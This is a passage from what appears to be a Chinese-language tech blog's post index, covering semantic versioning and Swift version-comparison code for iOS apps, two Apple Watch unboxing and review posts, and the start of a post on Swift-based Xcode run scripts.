y: 次版號 (minor)：當你做了向下相容的功能性新增 z: 修訂號 (patch)：當你做了向下相容的問題修正通用規則： 必須為非負的整數 不可補零 0.y.z 開頭為開發初始階段，不應該用於正式版版號 以數值遞增比較方式： 先比 主版號，主版號 等於時 再比 次版號，次版號 等於時 再比 修訂號。 ex: 1.0.0 &lt; 2.0.0 &lt; 2.1.0 &lt; 2.1.1另外還可在修訂號之後加入「先行版號資訊 (ex: 1.0.1-alpha)」或「版本編譯資訊 (ex: 1.0.0-alpha+001)」但 iOS APP 版號並不允許這兩個格式上傳至 App Store，所以這邊就不做贅述，詳細可參考「 語意化版本 」。✅：1.0.1, 1.0.0, 5.6.7❌：01.5.6, a1.2.3, 2.005.6實際使用關於實際使用在 iOS APP 版本控制上，因為我們僅作為 Release APP 版本的標記，不存在與其他 APP、軟體相依問題；所以在實際使用上的定義就因應各團隊自行定義，以下僅為個人想法： x: 主版號 (major)：有重大更新時（多個頁面介面翻新、主打功能上線） y: 次版號 (minor)：現有功能優化、補強時（大功能下的小功能新增） z: 修訂號 (patch)：修正目前版本的 bug時一般如果是緊急修復(Hot Fix)才會動到修訂號，正常狀況下都為 0；如果有新的版本上線可以將它歸回 0。 EX: 第一版上線(1.0.0) -&gt; 補強第一版的功能 (1.1.0) -&gt; 發現有問題要修復 (1.1.1) -&gt; 再次發現有問題 (1.1.2) -&gt; 繼續補強第一版的功能 (1.2.0) -&gt; 全新改版 (2.0.0) -&gt; 發現有問題要修復 (2.0.1) … 以此類推Version Number vs. Build NumberVersion Number (APP 版本號) App Store、外部識別用 Property List Key: CFBundleShortVersionString 內容僅能由數字和「.」組成 官方也是建議使用語意化版本 x.y.z 格式 2020121701、2.0、2.0.0.1 都可(下面會有總表統計 App Store 上 App 版本號的命名方式) 不可超過 18 個字元 格式不合可以 build &amp; run 但無法打包上傳到 App Store 僅能往上遞增、不能重複、不能下降 一般習慣使用語意化版本 x.y.z 或 x.y。Build Number 內部開發過程、階段識別使用，不會公開給使用者 打包上傳到 App Store 識別使用（相同 build number 無法重複打包上傳） Property List Key: CFBundleVersion 內容僅能由數字和「.」組成 官方也是建議使用語意化版本 x.y.z 格式 1、2020121701、2.0、2.0.0.1 都可 不可超過 18 個字元 格式不合可以 build &amp; run 但無法打包上傳到 App Store 同個 APP 版本號下不能重複，反之不同APP 版本號可以重複ex: 1.0.0 build: 1.0.0, 1.1.0 build: 1.0.0 ✅ 一般習慣使用日期、number（每個新版本都從 0 開始），並搭配 CI/fastlane 自動在打包時遞增 build number。稍微統計了一下排行版上 app 的版本號格式，如上圖。一般還是以 x.y.z 為主。版本號比較及判斷方式有時候我們會需要使用版本進行判斷，例如：低於 x.y.z 版本則跳強制更新、等於某個版本跳邀請評價，這時候就需要能比較兩個版本字串的功能。簡易方式let version = \"1.0.0\"print(version.compare(\"1.0.0\", options: .numeric) == .orderedSame) // true 1.0.0 = 1.0.0print(version.compare(\"1.22.0\", options: .numeric) == .orderedAscending) // true 1.0.0 &lt; 1.22.0print(version.compare(\"0.0.9\", options: .numeric) == .orderedDescending) // true 1.0.0 &gt; 0.0.9print(version.compare(\"2\", options: .numeric) == .orderedAscending) // true 1.0.0 &lt; 2也可以寫 String Extension：extension String { func versionCompare(_ otherVersion: String) -&gt; ComparisonResult { return self.compare(otherVersion, options: .numeric) }}⚠️但需注意若遇到格式不同要判斷相同是會有誤：let version = \"1.0.0\"version.compare(\"1\", options: .numeric) //.orderedDescending實際我們知道 1 == 1.0.0 ，但若用此方式判斷將得到 .orderedDescending ；可 參考此篇文章補0後再判斷 的做法；正常情況下我們選定 APP 版本格式後就不應該再變了，x.y.z 就一直用 x.y.z，不要一下 x.y.z 一下 x.y。複雜方式可直接使用已用輪子： mrackwitz/Version 以下為重造輪子。複雜方式這邊遵照使用語意化版本 x.y.z 最為格式規範，自行使用 Regex 做字串頗析並自行實作比較操作符，除了基本的 =/&gt;/≥/&lt;/≤ 外還多實作了 ~&gt; 操作符（同 Cocoapods 版本指定方式）並支援靜態輸入。~&gt; 操作符的定義是：大於等於此版本但小於此版本的(上一階層版號+1)EX:~&gt; 1.2.1: (1.2.1 &lt;= 版本 &lt; 1.3) 1.2.3,1.2.4...~&gt; 1.2: (1.2 &lt;= 版本 &lt; 2) 1.3,1.4,1.5,1.3.2,1.4.1...~&gt; 1: (1 &lt;= 版本 &lt; 2) 1.1.2,1.2.3,1.5.9,1.9.0... 首先我們需要定義出 Version 物件：@objcMembersclass Version: NSObject { private(set) var major: Int private(set) var minor: Int private(set) var patch: Int override var description: String { return \"\\(self.major),\\(self.minor),\\(self.patch)\" } init(_ major: Int, _ minor: Int, _ patch: Int) { self.major = major self.minor = minor self.patch = patch } init(_ string: String) throws { let result = try Version.parse(string: string) self.major = result.version.major self.minor = result.version.minor self.patch = result.version.patch } static func parse(string: String) throws -&gt; VersionParseResult { let regex = \"^(?:(&gt;=|&gt;|&lt;=|&lt;|~&gt;|=|!=){1}\\\\s*)?(0|[1-9]\\\\d*)\\\\.(0|[1-9]\\\\d*)\\\\.(0|[1-9]\\\\d*)$\" let result = string.groupInMatches(regex) if result.count == 4 { //start with operator... let versionOperator = VersionOperator(string: result[0]) guard versionOperator != .unSupported else { throw VersionUnSupported() } let major = Int(result[1]) ?? 0 let minor = Int(result[2]) ?? 0 let patch = Int(result[3]) ?? 0 return VersionParseResult(versionOperator, Version(major, minor, patch)) } else if result.count == 3 { //unSpecified operator... let major = Int(result[0]) ?? 0 let minor = Int(result[1]) ?? 0 let patch = Int(result[2]) ?? 0 return VersionParseResult(.unSpecified, Version(major, minor, patch)) } else { throw VersionUnSupported() } }}//Supported Objects@objc class VersionUnSupported: NSObject, Error { }@objc enum VersionOperator: Int { case equal case notEqual case higherThan case lowerThan case lowerThanOrEqual case higherThanOrEqual case optimistic case unSpecified case unSupported init(string: String) { switch string { case \"&gt;\": self = .higherThan case \"&lt;\": self = .lowerThan case \"&lt;=\": self = .lowerThanOrEqual case \"&gt;=\": self = .higherThanOrEqual case \"~&gt;\": self = .optimistic case \"=\": self = .equal case \"!=\": self = .notEqual default: self = .unSupported } }}@objcMembersclass VersionParseResult: NSObject { var versionOperator: VersionOperator var version: Version init(_ versionOperator: VersionOperator, _ version: Version) { self.versionOperator = versionOperator self.version = version }}可以看到 Version 就是個 major,minor,patch 的儲存器，解析方式寫成 static 方便外部呼叫使用，可能傳遞 1.0.0 or ≥1.0.1 這兩種格式，方便我們做字串解析、設定檔解析。Input: 1.0.0 =&gt; Output: .unSpecified, Version(1.0.0)Input: ≥ 1.0.1 =&gt; Output: .higherThanOrEqual, Version(1.0.0)Regex 是參考「 語意化版本文件 」中提供的 Regex 參考進行修改的：^(0|[1-9]\\d*)\\.(0|[1-9]\\d*)\\.(0|[1-9]\\d*)(?:-((?:0|[1-9]\\d*|\\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\\.(?:0|[1-9]\\d*|\\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?(?:\\+([0-9a-zA-Z-]+(?:\\.[0-9a-zA-Z-]+)*))?$ *因考量到專案與 Objective-c 混編， OC 也要能使用所以都宣告為 @objcMembers、也妥協使用兼容OC 的寫法。 (其實可以直接 VersionOperator 使用 enum: String、Result 使用 tuple/struct) *若實作物件派生自 NSObject 在實作 Comparable/Equatable == 時記得也要實作 !=，原始 NSObject 的 != 操作不會是你預期的結果。2.實作 Comparable 方法：extension Version: Comparable { static func &lt; (lhs: Version, rhs: Version) -&gt; Bool { if lhs.major &lt; rhs.major { return true } else if lhs.major == rhs.major { if lhs.minor &lt; rhs.minor { return true } else if lhs.minor == rhs.minor { if lhs.patch &lt; rhs.patch { return true } } } return false } static func == (lhs: Version, rhs: Version) -&gt; Bool { return lhs.major == rhs.major &amp;&amp; lhs.minor == rhs.minor &amp;&amp; lhs.patch == rhs.patch } static func != (lhs: Version, rhs: Version) -&gt; Bool { return !(lhs == rhs) } static func ~&gt; (lhs: Version, rhs: Version) -&gt; Bool { let start = Version(lhs.major, lhs.minor, lhs.patch) let end = Version(lhs.major, lhs.minor, lhs.patch) if end.patch &gt;= 0 { end.minor += 1 end.patch = 0 } else if end.minor &gt; 0 { end.major += 1 end.minor = 0 } else { end.major += 1 } return start &lt;= rhs &amp;&amp; rhs &lt; end } func compareWith(_ version: Version, operator: VersionOperator) -&gt; Bool { switch `operator` { case .equal, .unSpecified: return self == version case .notEqual: return self != version case .higherThan: return self &gt; version case .lowerThan: return self &lt; version case .lowerThanOrEqual: return self &lt;= version case .higherThanOrEqual: return self &gt;= version case .optimistic: return self ~&gt; version case .unSupported: return false } }}其實就是實現前文所述判斷邏輯，最後開一個 compareWith 的方法口，方便外部直接將解析結果帶入得到最終判斷。使用範例：let shouldAskUserFeedbackVersion = \"&gt;= 2.0.0\"let currentVersion = \"3.0.0\"do { let result = try Version.parse(shouldAskUserFeedbackVersion) result.version.comparWith(currentVersion, result.operator) // true} catch { print(\"version string parse error!\")}或是…Version(1,0,0) &gt;= Version(0,0,9) //true... 支援 &gt;/≥/&lt;/≤/=/!=/~&gt; 操作符。下一步Test cases…import XCTestclass VersionTests: XCTestCase { func testHigher() throws { let version = Version(3, 12, 1) XCTAssertEqual(version &gt; Version(2, 100, 120), true) XCTAssertEqual(version &gt; Version(3, 12, 0), true) XCTAssertEqual(version &gt; Version(3, 10, 0), true) XCTAssertEqual(version &gt;= Version(3, 12, 1), true) XCTAssertEqual(version &gt; Version(3, 12, 1), false) XCTAssertEqual(version &gt; Version(3, 12, 2), false) XCTAssertEqual(version &gt; Version(4, 0, 0), false) XCTAssertEqual(version &gt; Version(3, 13, 1), false) } func testLower() throws { let version = Version(3, 12, 1) XCTAssertEqual(version &lt; Version(2, 100, 120), false) XCTAssertEqual(version &lt; Version(3, 12, 0), false) XCTAssertEqual(version &lt; Version(3, 10, 0), false) XCTAssertEqual(version &lt;= Version(3, 12, 1), true) XCTAssertEqual(version &lt; Version(3, 12, 1), false) XCTAssertEqual(version &lt; Version(3, 12, 2), true) XCTAssertEqual(version &lt; Version(4, 0, 0), true) XCTAssertEqual(version &lt; Version(3, 13, 1), true) } func testEqual() throws { let version = Version(3, 12, 1) XCTAssertEqual(version == Version(3, 12, 1), true) XCTAssertEqual(version == Version(3, 12, 21), false) XCTAssertEqual(version != Version(3, 12, 1), false) XCTAssertEqual(version != Version(3, 12, 2), true) } func testOptimistic() throws { let version = Version(3, 12, 1) XCTAssertEqual(version ~&gt; Version(3, 12, 1), true) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 12, 9), true) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 13, 0), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 11, 1), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 13, 1), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(2, 13, 0), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 11, 100), false) //3.12.1 &lt;= $0 &lt; 3.13.0 } func testVersionParse() throws { let unSpecifiedVersion = try? Version.parse(string: \"1.2.3\") XCTAssertNotNil(unSpecifiedVersion) XCTAssertEqual(unSpecifiedVersion!.version == Version(1, 2, 3), true) XCTAssertEqual(unSpecifiedVersion!.versionOperator, .unSpecified) let optimisticVersion = try? Version.parse(string: \"~&gt; 1.2.3\") XCTAssertNotNil(optimisticVersion) XCTAssertEqual(optimisticVersion!.version == Version(1, 2, 3), true) XCTAssertEqual(optimisticVersion!.versionOperator, .optimistic) let higherThanVersion = try? Version.parse(string: \"&gt; 1.2.3\") XCTAssertNotNil(higherThanVersion) XCTAssertEqual(higherThanVersion!.version == Version(1, 2, 3), true) XCTAssertEqual(higherThanVersion!.versionOperator, .higherThan) XCTAssertThrowsError(try Version.parse(string: \"!! 1.2.3\")) { error in XCTAssertEqual(error is VersionUnSupported, true) } }}目前打算將 Version 再進行優化、效能測試調整、整理打包，然後跑一次建立自己的 cocoapods 流程。不過目前已經有很完整的 Version 處理 Pod 專案，所以不必要重造輪子，單純只是想順一下建立流程ＸＤ。也許也還會為已有的輪子提交實作 ~&gt; 的 PR。參考資料： Xcode Help 語意化版本 2.0.0 How to compare two app version strings in Swift mrackwitz/Version有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 6,402 Total Views Last Statistics Date: 2025-01-19 | 6,365 Views on Medium. " }, { "title": "Apple Watch 原廠不鏽鋼米蘭錶帶開箱", "url": "/posts/c0f99f987d9c/", "categories": "ZRealm Life.", "tags": "apple-watch, 生活, 開箱, apple, 米蘭錶帶", "date": "2020-11-02 23:23:46 +0800", "snippet": "Apple Watch 原廠不鏽鋼米蘭錶帶開箱Apple 原廠不鏽鋼 44 公釐石墨色米蘭式錶環開箱緊接著上篇「 Apple Watch Series 6 開箱 &amp; 兩年使用心得 」這次也終於狠下心入手了 原廠的米蘭錶帶 ，其實兩年前就想入手但一直沒下手；這次正好一次更新，反正蘋果保證錶帶能通用在所有後續的 Apple Watch 版本，所以不擔心之後更新手錶後錶帶不能使用。優點米蘭...", "content": "Apple Watch 原廠不鏽鋼米蘭錶帶開箱Apple 原廠不鏽鋼 44 公釐石墨色米蘭式錶環開箱緊接著上篇「 Apple Watch Series 6 開箱 &amp; 兩年使用心得 」這次也終於狠下心入手了 原廠的米蘭錶帶 ，其實兩年前就想入手但一直沒下手；這次正好一次更新，反正蘋果保證錶帶能通用在所有後續的 Apple Watch 版本，所以不擔心之後更新手錶後錶帶不能使用。優點米蘭錶帶由不鏽鋼織網與磁力錶環組成，不鏽鋼織網的好處是透氣、速乾；磁力錶環讓整條錶帶能調整至任意位置、更貼合手、穿戴方便、磁力很強不怕會掉；最重要的是讓 Apple Watch 整體更為正式、更好配合穿搭。缺點夾毛髮、夾毛髮、夾毛髮、比較重。原廠 vs 副廠？潛伏在 Apple 社團許久，觀察到大家最常問的問題就是米蘭錶帶原廠 vs 副廠的問題；個人覺得差別不大，主要還是在細節跟做工，原廠同樣會夾毛髮，但原廠的編織作工很細膩一體成型、磁貼部分磁力很強不會鬆動、乾淨親膚不會有鐵鏽味，但價差也差了好幾倍（原廠要價 $ 3,100），最好還是都先摸過實品再決定，個人猜測副廠 1~2千的米蘭錶帶應該就幾乎等於原廠的做工了。尺寸同 上篇 ，建議手較小的購買 Apple Watch 40 mm，因為 40 mm 的米蘭錶帶，手腕圍為 130–180 mm；相較 44 mm 的米蘭錶帶，手腕圍 150–200 mm 再短 20 mm。錶帶是一體成型長度無法調整；如果錶帶已經調到緊繃還是太大那只能考慮副廠，不然就吃胖點（？）所以還是去門市試戴一下比較保險。 朋友的案例，手太小買 44 + 米蘭錶帶，只能貼到底還有點「ㄌㄤ」！開箱 * 2020/11/01 購於 Apple Store 101 直營店。一樣樸實無華的紙質包裝包裝背面現在也不叫太空灰了，叫石墨色。內容物類似原廠矽膠錶帶，但差別在沒有多附短版的錶帶ＸＤ本體磁力錶扣磁力錶扣，可吸在任意位置，任意調整表環大小安裝指示有磁貼的那邊在下在外扣入 Apple Watch 本體。 不要像我一樣一開始裝反還不知道，雖然也沒差？：正確版！完成！實戴圖背面實戴圖正面補充原廠錶帶細節 *簡易辨別原廠/副廠米蘭錶帶的方法，但不一定準確；從合法通路購入才能確保不被騙！連接端 - 靠近磁力錶扣的那端 — 底部 — 有「Assembled in China」字樣連接端另一端 — 表面 — 有「44MM」字樣延伸閱讀 Apple Watch Series 6 開箱 &amp; 兩年使用心得有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 35,234 Total Views Last Statistics Date: 2025-01-19 | 34,119 Views on Medium. " }, { "title": "Apple Watch Series 6 開箱 & 兩年使用體驗", "url": "/posts/eab0e984043/", "categories": "ZRealm Life.", "tags": "apple, apple-watch-series-6, apple-watch, 生活, 開箱", "date": "2020-10-14 20:48:38 +0800", "snippet": "Apple Watch Series 6 開箱 &amp; 兩年使用心得Apple Watch Series 6 開箱及選購指南＆兩年使用心得體驗彙整前言時光飛逝，距離 上一篇開箱 Apple Watch Series 4 的文章 也已經過了兩年了；以功能來說 Series 4 綽綽有餘沒有升級的必要，Series 5/Series 6 沒有什麼核心的突破功能，都是有會更好、沒有也沒關係的更...", "content": "Apple Watch Series 6 開箱 &amp; 兩年使用心得Apple Watch Series 6 開箱及選購指南＆兩年使用心得體驗彙整前言時光飛逝，距離 上一篇開箱 Apple Watch Series 4 的文章 也已經過了兩年了；以功能來說 Series 4 綽綽有餘沒有升級的必要，Series 5/Series 6 沒有什麼核心的突破功能，都是有會更好、沒有也沒關係的更新。但因 小鬼的新聞 ，所幸將原有的 Series 4 LTE 版先給家人配戴使用了；LTE 版遇到狀況可以不受手機有沒有在身邊的限制，都能撥出緊急電話，相較 GPS 版更加安全。個人的使用習慣是出門配戴，回家就拔下來充電，睡覺不會配戴，所以少了睡眠體驗的部分。我 Series 4 買的是 LTE 版，但由於手機都會帶在身邊實在沒必要每個月多付 $199 月費開通，而且在手錶上回訊息很麻煩、接電話也要有 AirPods 才方便，再加上手錶上的 Spotify 純粹是播放控制器，無法離開 iPhone 獨立播放（只有 Apple Music/KKBOX 可） and… 本人是 iOS APP / watchOS APP 開發者[2020–10–24 更新] ：Spotify 已支援獨立播放，在手錶 Spotify APP 中選擇播放裝置-&gt;Apple Watch-&gt;連線藍牙耳機-&gt;即可播放！（依然還不支援離線下載播放，需再有網路環境下才可使用）。Apple Watch Series 6 開箱直接進入本文重頭戲。下單這次選擇 GPS 44’mm 鋁合金版賽普樂絲綠（軍綠），搭配我的 iPhone 11 Pro 軍綠。沒有跟到第一批購買，我 9/15 晚上下單： 系統給的預估收到時間 10/16~10/19（可能剛好遇到大陸國慶長假） 10/10 通知發貨，預估 10/13 前就能拿到 10/13 通知因海關延誤到貨日期可能稍有延誤 實際 10/14 拿到，不過還是比原始預估收貨時間來得早了！開箱Apple Watch + 犀牛盾保護殼組翻開背面，開箱！開箱全過程完全用不到刀子，一路撕到底。Open!一個錶帶一個機體。這一代包裝厚度明顯減少許多（少了豆腐頭）機體開箱只附磁吸充電線。機體特寫這次機體的保護材質改為紙製的，上一代我記得是黑色的絨布。錶帶開箱組合！背面組合時可先安裝上半部錶帶，再拉掉紙質保護套，比較不容易手滑。Apple Watch 6 + iPhone 11 Prowith 奧樂雞泳圈雞Apple Watch 6 with 犀牛盾保護殼血氧測試玩一下這代的主打功能。隨顯螢幕休眠 vs 顯示時挺好的現在開始螢幕不會熄滅，不用抬腕等螢幕亮查看消息！ 開箱結束。兩年使用心得彙整整理一下這兩年的使用感覺和我自己的選購指南。提升生活體驗增加專注力Apple Watch 作為手機的延伸，定位在手機與人之間的緩衝；我們目前對電子產品的依賴就是直面手機、直面紛紛擾擾的通知資訊。不知道你是否跟我一樣覺得手機的通知很嚇人，即使是震動所發出的聲音也是，有時收到通知心臟也跟著抖了一下；接著下意識就拿出手機看了看，重要的事再接著處理、不重要的話就收起手機；然後這個流程每天不斷的重複在生活之中…雖然你大可以關閉聲音通知、關閉靜音時震動、甚至關閉所有通知功能；但另一方面你也因此與世界脫鉤，錯過了真的重要的通知訊息，結果產生另一種無時無刻都拿手機出來檢查的焦慮。綜合以上狀況 Apple Watch 就能在其中充當潤滑劑，在人與手機之間多加了一個漏斗進行過濾，手錶配戴中&amp;手機休眠時僅手錶會通知，可以設定特定 APP 的通知才會傳到手錶、關閉特定 APP 通知聲音/震動。你可能會說，這些設定不是跟手機一樣？但就體驗來說，手錶的聲音/震動更為輕柔不干擾，即使你關閉聲音/震動也能在抬腕時快速查看有無通知。日常體驗的提升在及增加專注力的方式就是在手錶上快速 Review 通知訊息，然後決定要繼續當前的工作，還是拿出手機處理訊息內容；中間被打斷的時間非常短（就是看手錶的時間）、也避免一直拿出手機會分心其他事情，增加做事效率。健康生活、記錄運動透過有 Apple Watch 才能使用的獨佔的「健身」APP，能記錄你一天的生活，包含每天活動量、走路、心跳、運動紀錄，活動量增減統計、更仔細的健康資訊；社群方面還能與朋友競賽活動量、解鎖勳章，增加運動動力。不過運動很看人，會運動的人還是會運動、不會運動的人也不會因為手錶而去運動；他頂多就是增加了運動的紀錄跟趣味性。Apple Pay手機都不用拿出來手錶按兩下就能感應付款，非常方便；尤其在已經大包小包的時候，沒有多餘的手去口袋掏手機出來時；另外也能安裝有支援 Apple Watch APP 的發票 APP，先點 APP 開載具條碼讓店員掃，然後再按兩下叫出 Apple Pay 付款。我個人最常見的使用習慣是用手機 widget 讓店員掃載具或是會員條碼（如 7–11/全家，因他們也沒提供 Apple Watch APP），然後在快速按兩下手錶叫出 Apple Pay，同一隻手感應付款。 存裡面，不用收據。個人風格隨你搭配錶面、錶帶都能隨時依照你的心情更換；錶面固定了幾個，幾個上班用、幾個放假用；錶帶這兩年買了四條…有皮革的、有金屬的、有編織的，還有保護殼顏色更換…根據穿搭搭配。蘋果全家桶連動 手錶可直接解鎖 Mac 電腦 手錶可一鍵查找手機（強迫手機發出嘟嘟聲） 手錶可當藍芽自拍按鈕，控制手機鏡頭拍照查看天氣個人很習慣看手錶的當前天氣狀況、降雨機率，一目瞭然；我用手機看都要點好幾層才能看到我要的資訊。鬧鐘及計時倒數計時器跟鬧鐘也是我很愛用的功能，可以快速在手錶上啟動倒數計時器，在配戴手錶的情況下計時器到跟鬧鐘響時都會透過手錶通知你（如果手錶開靜音則用手錶震動提醒你）個人覺得非常舒服，尤其是想自己小憩一下時，怕鬧鐘鈴聲或手機鬧鐘震動會打擾到其他同事。地圖騎機車時蠻好用的，可以 直接查看路線地圖 、路線/轉彎震動提示；但缺點就是地圖沒有針對機車優化，要 自己注意禁行機車路線 ，路線規劃能力普通。手錶查看路線地圖Google Map 最近重回 Apple Watch ，但沒辦法直接查看路線地圖，只有文字導航提示功能。跌倒偵測因最近大家很注意這個項目，特別列出來分享個人觸發經驗；有一次坐車上車時左手快速且大力地蹬了一下座椅，觸發成功跌倒偵測；搭會先瘋狂連續震動和發出聲音呼叫你，看你有沒有意識，如果不理他 30 秒後就會播打緊急電話及通知設定的緊急聯絡人。Apple Watch 跌倒偵測 實測，1分鐘打給119救援。 - watchOS 5 之前是超過 65 歲才會預設開啟跌倒偵測、小於 65 歲預設是關閉的；這部分可以確認一下設定。 - 緊急聯絡人可指定多位，需事先設定。推薦安裝的 APP有看過 前一篇開箱 的朋友，那篇文章除了開箱、使用教學，還有一些 APP 推薦；老實說後來我都刪了，只留內建的 APP 跟一些常用的通訊軟體；因為只有一開始新奇會裝一堆 APP，後來也都沒在用。說實話需要複雜操作的時候你會用手機，手錶真的只需要快速而已。Apple Watch 這兩年的發展如同前述，Series 4 與 Series 6 功能、產品定位方面都沒有變；都是 iPhone 手機的延伸，並非要取代 iPhone；這兩年並沒有突破性功能，續航也還是一天一充。第三方 APP 方面兩年來沒新增多少，但有越來越多的趨勢；Line、Goolge Map 最近更新也都加強了 Apple Watch APP 部分，沒有被遺忘。之前寫過一篇文章分享 自己動手做 Apple Watch APP 的經驗，基於 watchOS 5 開發，可以發現官方開放的功能很少（目前也差不多），所以第三方能發揮的空間有限以至於 APP 很少。watchOS目前已更新到 watchOS 7，同 iOS 一年一更。watchOS 6： 加入環境噪音偵測、月經記錄（適合女性朋友）、網路對講機watchOS 7： 加入睡眠追蹤功能、洗手時洗手時間輔助提示、家庭共享功能watchOS 7 家庭共享功能 （僅限 LTE 版）這部分我因為把原本 Series 4 手錶讓給家人有實際體驗過，可 參考此開箱影片 ；這功能手錶是綁在你的手機上、手錶要在附近才能更改設定，設定流程完成後部分設定無法再調整要重新設定，被共享的家人只能使用，不能自行客製化。好處是配戴者不一定要是 iPhone 用戶！ 根據 官網資料 ，此功能僅限配備行動網路 LTE 版 Series 4 後續機型才能使用！選購指南到底該不該買？我想會看到這邊的朋友，80% 都已經想買了；我覺得如果是科技愛好者值得買來玩玩、如果手錶對你來說是配件，同樣的價格可以買到更美的、如果是只為了運動而買，有更好的運動錶可以考慮，Apple Watch 偏綜合需求及增強體驗所設計。 小鬼的案例其實有 Apple Watch 也無法避免因小鬼是洗完澡出浴室時跌倒，Apple Watch 防水但並不防水蒸氣 ，如果時常戴手錶洗澡很容易就壞掉了、另外因為要一天一充一般都是洗澡時拔下來充電，也不會配戴。 依然還只是手機的延伸、蘋果實驗性產品 一天一充，出門也都要帶充電器 在從 Series 4 更換到 Series 6 時中間隔了兩三週都沒戴，個人感覺也沒差。Series 6 or SE or 二手 Series 4/5?性能上都很足夠再撐個3~5年都還行，有預算當然買新不買舊，追求 CP 值可以購買 SE ，如果預算有限可以買二手 Series 4/5/LTE版，較好入手。 Apple Watch 僅能與 iPhone 配對（ Android 手機、iPad 都無法 ），另外也要考慮當前手機 iOS 版本， watchOS 7 僅限配對 iOS ≥ 14 以上機種 （ watchOS 6 =&gt; iOS ≥ 13/watchOS 5 =&gt; iOS ≥ 12） iPhone 要先升級到相對應的最低 iOS 版本才能配對使用。Series 6 / SE 不附豆腐充電頭。watchOS 7 的 家庭共享功能 （可查看小孩動向狀態、老人健康狀況） 只限 Series 4 以上版本或 SE 版 。鋁合金 or 不鏽鋼 or 鈦金屬？不鏽鋼版本 （感謝同事友情支援）看你怎麼定位這隻錶，如果是新奇好玩買鋁合金就好；如果要加強飾品配件屬性則買不鏽鋼以上版本，更美更好搭。鋁合金版二手市場需求較多，新一代出來比較好脫手（我的 Series 4 還能賣到 7~8千）。鋁合金版的機身跟玻璃都較脆弱、螢幕玻璃也不抗刮，建議再多買保護殼+貼滿版保護貼。保護殼（約 $400）+ 保護貼建議找水凝貼、果凍貼（約 $800）否則容易遇到不貼合問題；總計約再多+ $1500 鋁合金版也能有完整的保護。 另外附上血淚教訓，如果你有貼保護貼一定要買保護殼否則容易碎邊（我因為這樣重貼了三張損失快 $3000）、保護貼一定要找好的能貼合的不然會很難用，都是浪費$。小豪包膜的 HAO 果凍膠滿版玻璃保護貼全透明＆全膠完全貼合，不影響滑動順暢跟顯示。犀牛盾+保護貼 螢幕會變稍微厚一點點，所以內框可能會有一點浮起（看保護殼的公差），不過卡扣都還是扣得進去。 小豪包膜是說建議不要多塞犀牛盾的內框會比較容易擠壓到保護貼，只用外框就好；但我 Series 4 這個狀態用了兩年都沒事，所以大家就自行斟酌囉。40mm or 44mm?看你手的粗細，男生一般建議戴 44，太小有點怪。 如果你要買鋁合金+保護殼要考慮加上保護殼的大小會不會太大。GPS or LTE 行動網路版?考量到之前買 LTE 都沒用這次改買 GPS 版了，便宜 $ 3000。GPS or LTE 的考量點除了你會不會有場景會只戴手錶出門，還有最近大家最在意的跌倒報警功能， GPS 版僅限手機在身邊或手錶有辦法連到當前網路環境 WiFi 下，手錶連線到手機進行緊急報警 （若條件無法成立則一樣無法通知報警）；LTE 版則可獨立運作，相對更安全；手機與手錶間通訊也是一樣，GPS版或未開通 LTE，則透過手機在手錶附近、手錶有辦法連到當前網路環境 WIFI 下進行通訊。 手錶有辦法連到當前網路環境 WiFi 的意思是，手機、手錶曾經連線過此 WiFi ，系統有紀錄能直接連線。watchOS 7 的 家庭共享功能 （可查看小孩動向狀態、老人健康狀況） 只有 LTE 版能使用 ，因為 手錶的資料是傳回設定人（家長）而非配戴者的手機 。錶帶部分錶帶只區分： 大的： 42 （Apple Watch 3 以下）/ 44 （Apple Watch 4 以上） 小的： 38 （Apple Watch 3 以下）/ 40 （Apple Watch 4 以上）且蘋果表示保證錶帶尺寸都不會更改（不然誰買 Hermès 版ＸＤ）至少目前 1~6 代錶帶都能共通。 Apple Watch 原廠不鏽鋼米蘭錶帶開箱 ：Apple Watch 原廠不鏽鋼米蘭錶帶開箱一般版 / Nike 版 / Hermès 版Nike 版只多 Nike 版專屬錶面，Hermès 版除了有Hermès 版專屬錶面還是Hermès 錶帶配不銹鋼版本。升級指南如果你現在手上的是 Series 3/Series 2/Series 1 建議可升級，至少升到 Series 4 ；4 開始螢幕變滿版（很多新的錶面都要求 4 以上才能用）、處理器效能更好幾乎不會卡頓，升級有感。Series 4 可升可不升，畢竟主要只差在隨時顯示螢幕及血氧計，Apple Watch 的抬腕顯示夠快夠敏捷，隨時顯示當然更好但也沒一定要；血氧計部分沒通過醫療驗證，僅作參考。如果已經有 Series 5，可以再等等下一代，沒有升級的必要。詳細比較可參考官網「 比較所有錶款 」，還有些細節功能的差異，例如：高度計、指南針…等等Apple 官網延伸閱讀 Apple Watch 原廠不鏽鋼米蘭錶帶開箱 看更多 Apple Watch 基礎使用教學、APP 推薦 AirPods 2 開箱及上手體驗心得 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 動手做一支 Apple Watch App 吧！(Swift)有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 62,643 Total Views Last Statistics Date: 2025-01-19 | 62,643 Views on Medium. " }, { "title": "Xcode 直接使用 Swift 撰寫 Run Script！", "url": "/posts/41c49a75a743/", "categories": "ZRealm Dev.", "tags": "ios, shell-script, xcode, ios-app-development, toolkit", "date": "2020-09-17 23:53:20 +0800", "snippet": "Xcode 直接使用 Swift 撰寫 Shell Script！導入 Localization 多語系及 Image Assets 缺漏檢查、使用 Swift 打造 Shell Script 腳本Photo by Glenn Carstens-Peters緣由因為自己手殘，時常在編輯多語系檔案時遺漏「;」導致 app build 出來語言顯示出錯再加上隨著開發的推移語系檔案越來越龐大，重複...", "content": "Xcode 直接使用 Swift 撰寫 Shell Script！導入 Localization 多語系及 Image Assets 缺漏檢查、使用 Swift 打造 Shell Script 腳本Photo by Glenn 